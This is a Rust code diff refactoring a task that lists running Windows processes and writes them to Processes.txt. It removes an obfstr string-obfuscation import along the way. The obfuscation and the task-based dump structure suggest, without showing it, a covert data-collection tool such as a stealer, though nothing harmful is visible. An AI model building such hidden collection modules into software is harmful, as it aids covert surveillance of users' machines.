@@ -1,18 +1,20 @@
+use crate::alloc::borrow::ToOwned;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
 use core::ffi::CStr;
 use core::fmt::Write;
 use core::ptr::null_mut;
-use tasks::Task;
+use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use windows_sys::Win32::Foundation::{CloseHandle, MAX_PATH};
 use windows_sys::Win32::System::ProcessStatus::{K32EnumProcesses, K32GetModuleBaseNameA};
 use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
-use obfstr::obfstr as s;
 
 pub(super) struct ProcessesTask;
 
 impl Task for ProcessesTask {
+    parent_name!("Processes.txt");
+    
     unsafe fn run(&self, parent: &Path) {
         let processes = get_process_list();
 
@@ -37,8 +39,7 @@ impl Task for ProcessesTask {
             );
         }
 
-        let path = parent / s!("Processes.txt");
-        let _ = output.write_to(&path);
+        let _ = output.write_to(parent);
     }
 }
 
